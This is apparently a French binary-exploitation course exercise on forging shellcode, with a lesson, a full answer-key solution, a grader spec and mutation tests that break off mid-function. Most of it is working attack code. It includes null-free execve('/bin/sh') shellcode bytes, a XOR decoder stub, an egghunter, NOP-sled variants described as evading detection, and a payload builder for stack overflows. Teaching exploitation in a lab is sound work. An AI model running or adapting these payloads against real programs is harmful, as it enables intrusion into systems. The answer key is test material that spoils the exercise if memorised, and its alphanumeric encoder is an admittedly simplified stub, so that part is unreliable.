# Exercice 3.4.5-c : Le Forgeur de Shellcode

## Metadata
- **Exercice ID**: 3.4.5-c
- **Titre**: Le Forgeur de Shellcode
- **Module**: 3.4 - Exploitation Binaire
- **Niveau**: Exploitation Stack (Niveau 3)
- **Difficulté**: ⭐⭐⭐⭐⭐⭐⭐ (7/10 - Expert)
- **Tier**: 2
- **XP**: 550

## Concepts Couverts
| ID Concept | Description |
|------------|-------------|
| 3.4.5.i | Shellcode Injection |
| 3.4.5.j | Shellcode Encoding (shikata_ga_nai, XOR) |
| 3.4.5.k | Egghunter |
| 3.4.5.l | Alphanumeric Shellcode |

## Prerequis
- Module 3.4.1-a : Register Decoder (registres x86-64)
- Module 3.4.5-a/b : Buffer Overflow basics
- Comprehension des syscalls Linux x86-64
- Bases de l'assembleur x86-64

---

## Section 1 : Prototype de Fonction

```python
"""
Module: shellcode_forger - Framework de Création et Encodage de Shellcode
Architecture: x86-64 Linux
Contraintes: Création manuelle, pas de pwntools/msfvenom
"""

from dataclasses import dataclass
from enum import Enum
from typing import Optional
import struct


class ShellcodeType(Enum):
    """Types de shellcode supportés."""
    EXECVE_BINSH = "execve_binsh"
    EXECVE_CUSTOM = "execve_custom"
    REVERSE_SHELL = "reverse_shell"
    BIND_SHELL = "bind_shell"
    READ_FILE = "read_file"
    EGGHUNTER = "egghunter"


class EncodingType(Enum):
    """Types d'encodage."""
    NONE = "none"
    XOR_SINGLE = "xor_single"
    XOR_MULTI = "xor_multi"
    ALPHANUMERIC = "alphanumeric"
    UNICODE = "unicode"


@dataclass
class ShellcodeConfig:
    """Configuration pour la génération de shellcode."""
    shellcode_type: ShellcodeType
    bad_chars: bytes = b'\x00'
    max_size: int = 0  # 0 = illimité
    null_free: bool = True
    alphanumeric: bool = False


@dataclass
class EncodingResult:
    """Résultat de l'encodage."""
    original: bytes
    encoded: bytes
    decoder_stub: bytes
    final_shellcode: bytes
    key: bytes
    encoding_type: EncodingType


def generate_execve_shellcode(command: str = "/bin/sh") -> bytes:
    """
    Génère un shellcode execve minimal pour x86-64 Linux.

    Args:
        command: Commande à exécuter (default: /bin/sh)

    Returns:
        Shellcode en bytes

    Exemple:
        >>> sc = generate_execve_shellcode("/bin/sh")
        >>> len(sc) < 50
        True
        >>> b'\\x00' not in sc  # Null-free si possible
        True
    """
    pass


def encode_xor(shellcode: bytes, key: bytes, bad_chars: bytes = b'\x00') -> EncodingResult:
    """
    Encode un shellcode avec XOR et génère le decoder stub.

    Args:
        shellcode: Shellcode original
        key: Clé XOR (1 byte pour single, multiple pour multi-byte)
        bad_chars: Caractères interdits

    Returns:
        EncodingResult avec shellcode encodé et decoder stub

    Exemple:
        >>> sc = b'\\x31\\xc0\\x50'
        >>> result = encode_xor(sc, b'\\x41', b'\\x00')
        >>> result.encoded != sc
        True
        >>> all(b not in result.final_shellcode for b in b'\\x00')
        True
    """
    pass


def find_xor_key(shellcode: bytes, bad_chars: bytes) -> Optional[int]:
    """
    Trouve une clé XOR qui évite les bad chars.

    Args:
        shellcode: Shellcode à encoder
        bad_chars: Caractères à éviter

    Returns:
        Clé XOR valide (0-255) ou None si impossible

    Exemple:
        >>> sc = b'\\x00\\x50\\x48'
        >>> key = find_xor_key(sc, b'\\x00')
        >>> key is not None
        True
    """
    pass


def generate_decoder_stub(key: bytes, shellcode_length: int) -> bytes:
    """
    Génère un stub de décodage XOR en assembleur x86-64.

    Args:
        key: Clé XOR utilisée
        shellcode_length: Longueur du shellcode encodé

    Returns:
        Decoder stub en bytes

    Le stub doit:
    1. Obtenir l'adresse du shellcode encodé (call/pop ou jmp/call/pop)
    2. XOR chaque byte avec la clé
    3. Sauter au shellcode décodé
    """
    pass


def generate_egghunter(egg: bytes) -> bytes:
    """
    Génère un egghunter qui cherche un tag en mémoire.

    Args:
        egg: Tag de 4 bytes à chercher (répété 2 fois dans le payload)

    Returns:
        Egghunter shellcode

    L'egghunter:
    1. Scanne la mémoire page par page
    2. Gère les SIGSEGV via syscall access()
    3. Cherche egg+egg (8 bytes)
    4. Saute au shellcode après le tag

    Exemple:
        >>> hunter = generate_egghunter(b'W00T')
        >>> len(hunter) < 40  # Petit pour tenir dans un buffer limité
        True
    """
    pass


def generate_alphanumeric_shellcode(shellcode: bytes) -> bytes:
    """
    Convertit un shellcode en version alphanumeric (A-Za-z0-9).

    Args:
        shellcode: Shellcode original

    Returns:
        Shellcode alphanumeric avec decoder

    Technique: Encoder chaque byte comme séquence d'instructions
    alphanumeric qui le reconstruit.

    Exemple:
        >>> sc = b'\\x31\\xc0'
        >>> alpha_sc = generate_alphanumeric_shellcode(sc)
        >>> all(chr(b).isalnum() for b in alpha_sc)
        True
    """
    pass


def check_bad_chars(shellcode: bytes, bad_chars: bytes) -> dict:
    """
    Vérifie la présence de bad chars dans un shellcode.

    Args:
        shellcode: Shellcode à vérifier
        bad_chars: Caractères interdits

    Returns:
        Dict avec résultat de l'analyse

    Exemple:
        >>> result = check_bad_chars(b'\\x00\\x41\\x42', b'\\x00\\x0a')
        >>> result["has_bad_chars"]
        True
        >>> result["bad_char_positions"]
        [0]
    """
    pass


def generate_nop_sled(length: int, variant: str = "classic") -> bytes:
    """
    Génère un NOP sled de différents types.

    Args:
        length: Longueur du sled
        variant: "classic" (0x90), "multi" (instructions équivalentes)

    Returns:
        NOP sled en bytes

    Exemple:
        >>> sled = generate_nop_sled(100, "classic")
        >>> all(b == 0x90 for b in sled)
        True
    """
    pass


def build_payload(
    nop_sled_size: int,
    shellcode: bytes,
    padding_size: int,
    return_address: int,
    egg: bytes = None
) -> bytes:
    """
    Construit un payload complet.

    Args:
        nop_sled_size: Taille du NOP sled
        shellcode: Shellcode à exécuter
        padding_size: Padding après shellcode pour atteindre RIP
        return_address: Adresse de retour (milieu du NOP sled)
        egg: Si fourni, préfixe avec egg+egg pour egghunter

    Returns:
        Payload complet prêt à l'exploitation

    Structure:
    [NOP sled][shellcode][padding][return_address]
    ou avec egg:
    [egg][egg][shellcode]
    """
    pass
```

---

## Section 2 : Cours Intégré (Référentiel Complet)

### 2.1 Shellcode Basics (3.4.5.i)

Un **shellcode** est du code machine injectable conçu pour être exécuté après exploitation d'une vulnérabilité. Le terme vient historiquement de l'objectif d'obtenir un shell.

#### Contraintes du Shellcode

```
1. Position-Independent: Doit fonctionner à n'importe quelle adresse
2. Null-free: Souvent nécessaire (strcpy, etc.)
3. Compact: Doit tenir dans le buffer
4. Self-contained: Pas de dépendances externes
```

#### Syscalls Linux x86-64

```asm
; Convention d'appel syscall x86-64:
; rax = numéro syscall
; rdi = arg1, rsi = arg2, rdx = arg3
; r10 = arg4, r8 = arg5, r9 = arg6
; Résultat dans rax

; Syscalls utiles:
; execve = 59
; read = 0
; write = 1
; open = 2
; close = 3
; mmap = 9
; mprotect = 10
; exit = 60
; socket = 41
; connect = 42
; dup2 = 33
```

#### Shellcode execve("/bin/sh") minimal

```asm
; execve("/bin/sh", NULL, NULL) - ~27 bytes
section .text
global _start

_start:
    xor    rsi, rsi          ; rsi = NULL (argv)
    push   rsi               ; Push NULL terminator
    mov    rdi, 0x68732f2f6e69622f  ; "/bin//sh" en little-endian
    push   rdi
    push   rsp
    pop    rdi               ; rdi = &"/bin//sh"
    xor    rdx, rdx          ; rdx = NULL (envp)
    push   59
    pop    rax               ; rax = 59 (execve)
    syscall
```

### 2.2 Encodage XOR (3.4.5.j)

L'encodage permet d'éviter les **bad characters** - bytes qui causent des problèmes (null, newline, etc.).

#### Principe XOR

```
Propriétés:
- A XOR B = C
- C XOR B = A (réversible)
- A XOR A = 0

Encodage:
- shellcode[i] XOR key = encoded[i]

Décodage:
- encoded[i] XOR key = shellcode[i]
```

#### Decoder Stub Structure

```asm
; Technique JMP-CALL-POP pour obtenir l'adresse du shellcode
jmp short call_decoder

decoder:
    pop rsi                    ; RSI = adresse du shellcode encodé
    xor rcx, rcx
    mov cl, SHELLCODE_LENGTH   ; Compteur

decode_loop:
    xor byte [rsi], XOR_KEY    ; Décode un byte
    inc rsi
    loop decode_loop           ; Boucle
    jmp short shellcode        ; Exécute le shellcode décodé

call_decoder:
    call decoder

shellcode:
    ; Shellcode encodé ici...
```

#### Trouver une clé valide

```python
def find_valid_xor_key(shellcode, bad_chars):
    """
    Trouve une clé XOR qui n'introduit pas de bad chars.
    """
    for key in range(1, 256):  # 0 ne change rien
        valid = True
        for byte in shellcode:
            encoded_byte = byte ^ key
            if encoded_byte in bad_chars or key in bad_chars:
                valid = False
                break
        if valid:
            return key
    return None
```

### 2.3 Egghunter (3.4.5.k)

Un **egghunter** est un petit shellcode qui cherche le shellcode principal en mémoire.

#### Utilité

```
Situation:
- Buffer trop petit pour le shellcode complet
- Shellcode ailleurs en mémoire (mais emplacement inconnu)

Solution:
1. Placer un "egg" (tag) devant le shellcode principal
2. Injecter l'egghunter dans le petit buffer
3. L'egghunter scanne la mémoire et trouve l'egg
4. Saute au shellcode principal
```

#### Techniques de scan mémoire

```asm
; Technique access() syscall pour éviter les SIGSEGV
egghunter:
    xor edx, edx              ; EDX = 0 (adresse de départ)

next_page:
    or dx, 0xfff              ; Aligner sur fin de page
    inc edx                   ; Page suivante

next_address:
    push edx
    lea ebx, [edx+4]          ; Adresse à tester
    push byte 0x21            ; syscall access (33)
    pop eax
    int 0x80
    cmp al, 0xf2              ; EFAULT = page invalide
    pop edx
    jz next_page              ; Page invalide, passer à la suivante

    ; Page valide, chercher l'egg
    mov eax, 0x50905090       ; EGG (exemple)
    mov edi, edx
    scasd                     ; Comparer EAX avec [EDI]
    jnz next_address
    scasd                     ; Comparer le 2ème egg
    jnz next_address

    jmp edi                   ; Sauter au shellcode après les eggs
```

### 2.4 Shellcode Alphanumérique (3.4.5.l)

Un shellcode **alphanumeric** ne contient que des caractères A-Za-z0-9.

#### Pourquoi ?

```
- Filtres d'entrée: Certaines apps filtrent les non-alphanumériques
- Encodage URL: Caractères spéciaux encodés
- Protocoles texte: HTTP headers, etc.
```

#### Technique d'encodage

```python
# Instructions x86 alphanumériques utiles:
# push imm32:  0x68 + imm = 'h' + valeur
# pop eax:     0x58 = 'X'
# xor:         0x35 = '5' (mais limité)
# inc/dec:     0x40-0x4F = '@'-'O'

# Exemple: Construire 0xDEADBEEF
# On ne peut pas push directement (bytes non-alpha)
# On utilise des calculs:
# push 0x30303030  # "0000" en ASCII
# pop eax
# sub eax, ...     # Série de soustractions
```

#### Structures alphanumériques

```
Registres accessibles en alpha:
- push/pop: h (0x68), X-Z (0x58-0x5A)
- xor al, imm8: 4 (0x34) + imm alpha
- sub eax, imm32: - (0x2D) + imm alpha (si premier char '-')

Technique générale:
1. Mettre 0 dans un registre (push 0x30303030; pop; sub)
2. Construire des valeurs par calcul
3. Écrire en mémoire
4. Exécuter
```

### 2.5 NOP Sleds

Un **NOP sled** augmente la probabilité de toucher le shellcode quand l'adresse exacte est incertaine.

```
[NOP NOP NOP NOP NOP NOP NOP ... shellcode]
      ^
      Si on atterrit n'importe où ici,
      on glisse jusqu'au shellcode
```

#### Variantes de NOP

```asm
; NOP classique
0x90                    ; nop

; NOP multi-byte (évite détection)
0x89 0xF6              ; mov esi, esi
0x8D 0xB4 0x26 0x00... ; lea esi, [esi+0]
0x8D 0x76 0x00         ; lea esi, [esi+0]
0x66 0x90              ; nop (16-bit)

; Instructions "no-op" (pas d'effet visible)
0x40                    ; inc eax (si eax non utilisé après)
0x48                    ; dec eax
0x92                    ; xchg eax, edx (si on s'en fiche)
```

---

## Section 3 : Zone de Correction

```python
"""
CORRECTION COMPLETE - Shellcode Forger
"""

from dataclasses import dataclass
from enum import Enum
from typing import Optional
import struct


class ShellcodeType(Enum):
    EXECVE_BINSH = "execve_binsh"
    EXECVE_CUSTOM = "execve_custom"
    REVERSE_SHELL = "reverse_shell"
    BIND_SHELL = "bind_shell"
    READ_FILE = "read_file"
    EGGHUNTER = "egghunter"


class EncodingType(Enum):
    NONE = "none"
    XOR_SINGLE = "xor_single"
    XOR_MULTI = "xor_multi"
    ALPHANUMERIC = "alphanumeric"
    UNICODE = "unicode"


@dataclass
class EncodingResult:
    original: bytes
    encoded: bytes
    decoder_stub: bytes
    final_shellcode: bytes
    key: bytes
    encoding_type: EncodingType


def generate_execve_shellcode(command: str = "/bin/sh") -> bytes:
    """Génère un shellcode execve minimal pour x86-64 Linux."""

    # Shellcode execve("/bin/sh", NULL, NULL) - null-free
    # Cette version utilise des techniques pour éviter les null bytes

    if command == "/bin/sh":
        # Shellcode optimisé null-free pour /bin/sh
        # xor rsi, rsi
        # push rsi
        # mov rdi, 0x68732f2f6e69622f  ; "/bin//sh"
        # push rdi
        # push rsp
        # pop rdi
        # xor rdx, rdx
        # push 59
        # pop rax
        # syscall

        shellcode = bytes([
            0x48, 0x31, 0xf6,             # xor rsi, rsi
            0x56,                          # push rsi
            0x48, 0xbf,                    # movabs rdi, ...
            0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68,  # "/bin//sh"
            0x57,                          # push rdi
            0x54,                          # push rsp
            0x5f,                          # pop rdi
            0x48, 0x31, 0xd2,             # xor rdx, rdx
            0x6a, 0x3b,                    # push 59
            0x58,                          # pop rax
            0x0f, 0x05                     # syscall
        ])
    else:
        # Version générique - encode la commande
        # Pad command to 8 bytes or use push technique
        cmd_bytes = command.encode() + b'\x00'

        # Construire dynamiquement (plus complexe, simplifié ici)
        # Pour une vraie implémentation, il faudrait:
        # 1. Push la string en reverse
        # 2. Configurer les registres
        # 3. syscall

        # Version simplifiée avec le shellcode standard
        shellcode = bytes([
            0x48, 0x31, 0xf6,             # xor rsi, rsi
            0x56,                          # push rsi
            0x48, 0xbf,                    # movabs rdi, ...
        ])
        # Ajouter les 8 premiers bytes de la commande
        cmd_padded = (command + "\x00" * 8)[:8]
        shellcode += cmd_padded.encode()[::-1]  # Reverse pour little-endian
        shellcode += bytes([
            0x57, 0x54, 0x5f,
            0x48, 0x31, 0xd2,
            0x6a, 0x3b, 0x58,
            0x0f, 0x05
        ])

    return shellcode


def find_xor_key(shellcode: bytes, bad_chars: bytes) -> Optional[int]:
    """Trouve une clé XOR qui évite les bad chars."""
    bad_set = set(bad_chars)

    for key in range(1, 256):  # Skip 0, it doesn't change anything
        if key in bad_set:
            continue

        valid = True
        for byte in shellcode:
            encoded = byte ^ key
            if encoded in bad_set:
                valid = False
                break

        if valid:
            return key

    return None


def generate_decoder_stub(key: bytes, shellcode_length: int) -> bytes:
    """Génère un stub de décodage XOR en assembleur x86-64."""

    key_byte = key[0] if isinstance(key, bytes) else key

    # Technique: JMP-CALL-POP pour obtenir l'adresse
    # Cette version est null-free si key et length le permettent

    # Structure:
    # jmp short call_decoder    ; EB XX
    # decoder:
    #   pop rsi                 ; 5E
    #   xor rcx, rcx           ; 48 31 C9
    #   mov cl, length         ; B1 XX
    # decode_loop:
    #   xor byte [rsi], key    ; 80 36 XX
    #   inc rsi                ; 48 FF C6
    #   loop decode_loop       ; E2 F8
    # call_decoder:
    #   call decoder           ; E8 XX XX XX XX

    # Calculer les offsets
    decoder_code = bytes([
        0x5e,                          # pop rsi
        0x48, 0x31, 0xc9,             # xor rcx, rcx
        0xb1, shellcode_length & 0xff,  # mov cl, length
        0x80, 0x36, key_byte,         # xor byte [rsi], key
        0x48, 0xff, 0xc6,             # inc rsi
        0xe2, 0xf8,                    # loop -8 (back to xor)
    ])

    jmp_offset = len(decoder_code) + 5  # +5 for the call instruction
    call_offset = -(len(decoder_code) + 5)

    stub = bytes([0xeb, jmp_offset])  # jmp short
    stub += decoder_code
    stub += bytes([0xe8])  # call
    stub += struct.pack('<i', call_offset)

    return stub


def encode_xor(shellcode: bytes, key: bytes, bad_chars: bytes = b'\x00') -> EncodingResult:
    """Encode un shellcode avec XOR et génère le decoder stub."""

    key_byte = key[0] if isinstance(key, bytes) else key

    # Encoder le shellcode
    encoded = bytes([b ^ key_byte for b in shellcode])

    # Vérifier les bad chars dans le résultat
    bad_in_encoded = any(b in bad_chars for b in encoded)

    # Générer le decoder stub
    decoder_stub = generate_decoder_stub(key, len(shellcode))

    # Vérifier les bad chars dans le stub
    bad_in_stub = any(b in bad_chars for b in decoder_stub)

    # Combiner
    final_shellcode = decoder_stub + encoded

    return EncodingResult(
        original=shellcode,
        encoded=encoded,
        decoder_stub=decoder_stub,
        final_shellcode=final_shellcode,
        key=bytes([key_byte]),
        encoding_type=EncodingType.XOR_SINGLE
    )


def generate_egghunter(egg: bytes) -> bytes:
    """Génère un egghunter pour x86-64 Linux."""

    if len(egg) != 4:
        raise ValueError("Egg must be exactly 4 bytes")

    # Egghunter x86-64 utilisant access() syscall
    # Cherche egg+egg (8 bytes) pour éviter de se trouver soi-même

    egg_value = struct.unpack('<I', egg)[0]

    # Shellcode egghunter x86-64
    # Utilise syscall 21 (access) pour tester les pages

    egghunter = bytes([
        0x48, 0x31, 0xc9,             # xor rcx, rcx
        0x48, 0xf7, 0xe1,             # mul rcx  (rax=rdx=0)

        # next_page:
        0x66, 0x81, 0xca, 0xff, 0x0f,  # or dx, 0xfff
        0x48, 0xff, 0xc2,             # inc rdx

        # next_addr:
        0x48, 0x8d, 0x7a, 0x04,       # lea rdi, [rdx+4]
        0x6a, 0x15,                    # push 21 (access syscall)
        0x58,                          # pop rax
        0x0f, 0x05,                    # syscall
        0x3c, 0xf2,                    # cmp al, 0xf2 (EFAULT)
        0x74, 0xe9,                    # je next_page

        # Check for egg
        0xb8,                          # mov eax, egg
    ])
    egghunter += egg  # 4 bytes du egg

    egghunter += bytes([
        0x48, 0x89, 0xd7,             # mov rdi, rdx
        0xaf,                          # scasd
        0x75, 0xe4,                    # jne next_addr
        0xaf,                          # scasd (2nd egg)
        0x75, 0xe1,                    # jne next_addr
        0xff, 0xe7,                    # jmp rdi (shellcode after eggs)
    ])

    return egghunter


def generate_alphanumeric_shellcode(shellcode: bytes) -> bytes:
    """Convertit un shellcode en version alphanumeric."""

    # Cette implémentation est simplifiée
    # Une vraie implémentation nécessite un encodeur sophistiqué

    # Technique: Utiliser des instructions alphanumériques
    # pour reconstruire le shellcode en mémoire

    # Pour x86-64, c'est très complexe car peu d'instructions sont alpha
    # On utilise souvent des techniques de calcul

    # Caractères alphanumériques: 0x30-0x39, 0x41-0x5A, 0x61-0x7A
    alpha_chars = (
        set(range(0x30, 0x3A)) |  # 0-9
        set(range(0x41, 0x5B)) |  # A-Z
        set(range(0x61, 0x7B))    # a-z
    )

    # Vérifier si déjà alphanumeric
    if all(b in alpha_chars for b in shellcode):
        return shellcode

    # Encoder chaque byte non-alpha
    # Technique simplifiée: utiliser push/sub/xor pour construire les valeurs

    # Pour une vraie implémentation, il faudrait:
    # 1. Un encodeur complet type alpha2/alpha3
    # 2. Ou utiliser des techniques spécifiques x86-64

    # Version stub - retourne un message d'erreur encodé
    # En pratique, on utiliserait un tool comme alpha2

    # Encoder en base64-like avec instructions valides
    result = b''

    # Préfixe: Obtenir l'adresse de décodage
    # "VTX4" est souvent utilisé comme départ
    result += b'VTX4'  # push rsi; push rsp; pop rax; xor al, imm8

    # Encoder le shellcode (simplifié)
    for byte in shellcode:
        if byte in alpha_chars:
            # Byte déjà valide, l'ajouter
            result += bytes([byte])
        else:
            # Encoder comme deux caractères hex-like
            high = (byte >> 4) + 0x41
            low = (byte & 0x0f) + 0x41
            result += bytes([high, low])

    return result


def check_bad_chars(shellcode: bytes, bad_chars: bytes) -> dict:
    """Vérifie la présence de bad chars dans un shellcode."""

    bad_set = set(bad_chars)
    found_positions = []
    found_chars = []

    for i, byte in enumerate(shellcode):
        if byte in bad_set:
            found_positions.append(i)
            found_chars.append(byte)

    return {
        "has_bad_chars": len(found_positions) > 0,
        "bad_char_count": len(found_positions),
        "bad_char_positions": found_positions,
        "bad_chars_found": found_chars,
        "bad_chars_hex": [hex(b) for b in found_chars],
        "shellcode_length": len(shellcode),
        "clean_percentage": ((len(shellcode) - len(found_positions)) / len(shellcode) * 100)
                           if shellcode else 100
    }


def generate_nop_sled(length: int, variant: str = "classic") -> bytes:
    """Génère un NOP sled de différents types."""

    if variant == "classic":
        return b'\x90' * length

    elif variant == "multi":
        # Utiliser différentes instructions équivalentes à NOP
        multi_nops = [
            b'\x90',              # nop
            b'\x89\xf6',          # mov esi, esi
            b'\x89\xc0',          # mov eax, eax
            b'\x87\xdb',          # xchg ebx, ebx
            b'\x43\x4b',          # inc ebx; dec ebx
        ]

        result = b''
        i = 0
        while len(result) < length:
            nop = multi_nops[i % len(multi_nops)]
            if len(result) + len(nop) <= length:
                result += nop
            else:
                # Compléter avec des NOPs classiques
                result += b'\x90' * (length - len(result))
            i += 1

        return result[:length]

    elif variant == "random":
        # NOP-équivalents variés pour éviter la détection
        import random
        nop_equivalents = [
            b'\x90',
            b'\x40\x48',          # inc eax; dec eax (x86)
            b'\x89\xc0',          # mov eax, eax
            b'\x87\xc0',          # xchg eax, eax
        ]

        result = b''
        while len(result) < length:
            nop = random.choice(nop_equivalents)
            if len(result) + len(nop) <= length:
                result += nop
            else:
                result += b'\x90' * (length - len(result))

        return result[:length]

    else:
        return b'\x90' * length


def build_payload(
    nop_sled_size: int,
    shellcode: bytes,
    padding_size: int,
    return_address: int,
    egg: bytes = None
) -> bytes:
    """Construit un payload complet."""

    payload = b''

    # Ajouter les eggs si spécifié (pour egghunter)
    if egg:
        payload += egg + egg  # Double egg comme marqueur

    # NOP sled
    if nop_sled_size > 0:
        payload += generate_nop_sled(nop_sled_size)

    # Shellcode
    payload += shellcode

    # Padding pour atteindre saved RIP
    current_size = len(payload)
    if padding_size > current_size:
        payload += b'A' * (padding_size - current_size)

    # Return address (little-endian)
    payload += struct.pack('<Q', return_address)

    return payload


def main():
    """Démonstration du framework shellcode."""

    print("Shellcode Forger Demo")
    print("=" * 60)

    # Générer un shellcode execve
    shellcode = generate_execve_shellcode("/bin/sh")
    print(f"\nexecve shellcode:")
    print(f"  Length: {len(shellcode)} bytes")
    print(f"  Hex: {shellcode.hex()}")

    # Vérifier les bad chars
    bad_check = check_bad_chars(shellcode, b'\x00\x0a\x0d')
    print(f"\nBad char check (null, newline, carriage return):")
    print(f"  Has bad chars: {bad_check['has_bad_chars']}")
    print(f"  Positions: {bad_check['bad_char_positions']}")

    # Encoder avec XOR
    key = find_xor_key(shellcode, b'\x00\x0a\x0d')
    if key:
        print(f"\nXOR encoding:")
        print(f"  Key found: 0x{key:02x}")
        encoded = encode_xor(shellcode, bytes([key]), b'\x00\x0a\x0d')
        print(f"  Decoder stub: {len(encoded.decoder_stub)} bytes")
        print(f"  Total size: {len(encoded.final_shellcode)} bytes")

        # Vérifier que le résultat est clean
        final_check = check_bad_chars(encoded.final_shellcode, b'\x00\x0a\x0d')
        print(f"  Final has bad chars: {final_check['has_bad_chars']}")

    # Générer un egghunter
    print("\nEgghunter:")
    egg = b'W00T'
    hunter = generate_egghunter(egg)
    print(f"  Egg: {egg}")
    print(f"  Hunter size: {len(hunter)} bytes")

    # Construire un payload complet
    print("\nComplete payload:")
    payload = build_payload(
        nop_sled_size=100,
        shellcode=shellcode,
        padding_size=200,
        return_address=0x7fffffffe100
    )
    print(f"  Total size: {len(payload)} bytes")


if __name__ == "__main__":
    main()
```

---

## Section 4 : Fichier spec.json (ENGINE v22.1)

```json
{
  "exercise_id": "3.4.5-c",
  "title": "Le Forgeur de Shellcode",
  "module": "3.4",
  "tier": 2,
  "difficulty": 7,
  "xp_value": 550,
  "language": "python",
  "version": "3.12",
  "timeout_seconds": 30,
  "memory_limit_mb": 128,

  "test_cases": [
    {
      "id": "execve_shellcode_size",
      "description": "Execve shellcode is compact",
      "input": {
        "function": "generate_execve_shellcode",
        "args": {"command": "/bin/sh"}
      },
      "expected": {
        "max_length": 50
      },
      "points": 15
    },
    {
      "id": "find_xor_key_valid",
      "description": "Find valid XOR key avoiding bad chars",
      "input": {
        "function": "find_xor_key",
        "args": {
          "shellcode": [0, 80, 72, 49],
          "bad_chars": [0, 10]
        }
      },
      "expected": {
        "key_found": true,
        "key_range": [1, 255]
      },
      "points": 15
    },
    {
      "id": "xor_encode_clean",
      "description": "XOR encoding removes bad chars",
      "input": {
        "function": "encode_xor",
        "args": {
          "shellcode": [0, 49, 192],
          "key": [65],
          "bad_chars": [0]
        }
      },
      "expected": {
        "no_bad_chars_in_result": true
      },
      "points": 20
    },
    {
      "id": "egghunter_size",
      "description": "Egghunter is small enough",
      "input": {
        "function": "generate_egghunter",
        "args": {"egg": "W00T"}
      },
      "expected": {
        "max_length": 50
      },
      "points": 15
    },
    {
      "id": "bad_chars_detection",
      "description": "Detect bad characters correctly",
      "input": {
        "function": "check_bad_chars",
        "args": {
          "shellcode": [0, 65, 66, 10, 67],
          "bad_chars": [0, 10]
        }
      },
      "expected": {
        "has_bad_chars": true,
        "bad_char_positions": [0, 3],
        "bad_char_count": 2
      },
      "points": 10
    },
    {
      "id": "nop_sled_classic",
      "description": "Classic NOP sled generation",
      "input": {
        "function": "generate_nop_sled",
        "args": {"length": 100, "variant": "classic"}
      },
      "expected": {
        "length": 100,
        "all_nops": true
      },
      "points": 10
    },
    {
      "id": "payload_structure",
      "description": "Complete payload with correct structure",
      "input": {
        "function": "build_payload",
        "args": {
          "nop_sled_size": 50,
          "shellcode": [144, 144, 49, 192],
          "padding_size": 100,
          "return_address": 140737488355584
        }
      },
      "expected": {
        "min_length": 108,
        "ends_with_address": true
      },
      "points": 15
    }
  ],

  "edge_cases": [
    {
      "id": "no_valid_key",
      "description": "No valid XOR key exists",
      "input": {
        "function": "find_xor_key",
        "args": {
          "shellcode": "all_possible_bytes",
          "bad_chars": "all_possible_bytes"
        }
      },
      "expected_behavior": "Return None when no valid key exists"
    },
    {
      "id": "egg_wrong_size",
      "description": "Egg not 4 bytes",
      "input": {
        "function": "generate_egghunter",
        "args": {"egg": "ABC"}
      },
      "expected_behavior": "Raise ValueError for wrong egg size"
    }
  ],

  "validation": {
    "required_functions": [
      "generate_execve_shellcode",
      "encode_xor",
      "find_xor_key",
      "generate_decoder_stub",
      "generate_egghunter",
      "generate_alphanumeric_shellcode",
      "check_bad_chars",
      "generate_nop_sled",
      "build_payload"
    ],
    "required_classes": ["ShellcodeType", "EncodingType", "EncodingResult"],
    "forbidden_imports": ["pwntools", "pwnlib", "msfvenom", "subprocess"],
    "min_test_coverage": 80
  }
}
```

---

## Section 5 : Tests de Mutation

```python
"""
Tests de mutation pour shellcode_forger.py
"""

import unittest


class TestShellcodeGenerationMutations(unittest.TestCase):
    """Tests de mutation pour la génération de shellcode."""

    def setUp(self):
        from shellcode_forger import generate_execve_shellcode
        self.generate = generate_execve_shellcode

    # Mutant 1: Shellcode too large
    def test_mutant_shellcode_size(self):
        """MUTANT: Generating oversized shellcode."""
        sc = self.generate("/bin/sh")
        self.assertLess(len(sc), 50,
                       "Shellcode should be compact (<50 bytes)")

    # Mutant 2: Contains syscall instruction
    def test_mutant_has_syscall(self):
        """MUTANT: Missing syscall instruction."""
        sc = self.generate("/bin/sh")
        # syscall = 0x0f 0x05
        self.assertIn(b'\x0f\x05', sc,
                     "Shellcode must contain syscall instruction")


class TestXOREncodingMutations(unittest.TestCase):
    """Tests de mutation pour l'encodage XOR."""

    def setUp(self):
        from shellcode_forger import encode_xor, find_xor_key
        self.encode = encode_xor
        self.find_key = find_xor_key

    # Mutant 3: XOR not reversible
    def test_mutant_xor_reversible(self):
        """MUTANT: XOR encoding not correctly reversible."""
        original = bytes([0x31, 0xc0, 0x50, 0x68])
        key = bytes([0x41])

        result = self.encode(original, key, b'\x00')

        # Decode manually and check
        decoded = bytes([b ^ key[0] for b in result.encoded])
        self.assertEqual(decoded, original,
                        "XOR encoding must be reversible")

    # Mutant 4: Key introduces bad chars
    def test_mutant_key_avoids_bad_chars(self):
        """MUTANT: XOR key doesn't avoid bad chars."""
        shellcode = bytes([0x00, 0x41, 0x42])
        bad_chars = b'\x00\x0a'

        key = self.find_key(shellcode, bad_chars)

        if key is not None:
            # Verify key itself is not a bad char
            self.assertNotIn(key, bad_chars)

            # Verify encoded result has no bad chars
            encoded = bytes([b ^ key for b in shellcode])
            for bc in bad_chars:
                self.assertNotIn(bc, encoded)


class TestEgghunterMutations(unittest.TestCase):
    """Tests de mutation pour l'egghunter."""

    def setUp(self):
        from shellcode_forger import generate_egghunter
        self.generate = generate_egghunter

    # Mutant 5: Egghunter too large
    def test_mutant_egghunter_size(self):
        """MUTANT: Egghunter exceeds size limit."""
        hunter = self.generate(b'W00T')
        self.assertLess(len(hunter), 50,
                       "Egghunter must be small (<50 bytes)")

    # Mutant 6: Egg not in egghunter
    def test_mutant_egg_present(self):
        """MUTANT: Egg value not incorporated in egghunter."""
        egg = b'TEST'
        hunter = self.generate(egg)

        # The egg should appear in the egghunter
        self.assertIn(egg, hunter,
                     "Egg must be present in egghunter code")

    # Mutant 7: Wrong egg size validation
    def test_mutant_egg_size_check(self):
        """MUTANT: Not validating egg size."""
        with self.assertRaises(ValueError):
            self.generate(b'ABC')  # Only 3 bytes

        with self.assertRaises(ValueError):
            self.generate(b'ABCDE')  # 5 bytes


class TestBadCharsMutations(unittest.TestCase):
    """Tests de mutation pour la détection de bad chars."""

    def setUp(self):
        from shellcode_forger import check_bad_chars
        self.check = check_bad_chars

    # Mutant 8: Not detecting all bad chars
    def test_mutant_detect_all(self):
        """MUTANT: Missing some bad char occurrences."""
        shellcode = bytes([0x00, 0x41, 0x00, 0x0a, 0x42])
        bad_chars = bytes([0x00, 0x0a])

        result = self.check(shellcode, bad_chars)

        self.assertEqual(result["bad_char_count"], 3)
        self.assertEqual(sorted(result["bad_char_positions"]), [0, 2, 3])

    # Mutant 9: Wrong has_bad_chars flag
    def test_mutant_has_flag(self):
        """MUTANT: has_bad_chars flag incorrect."""
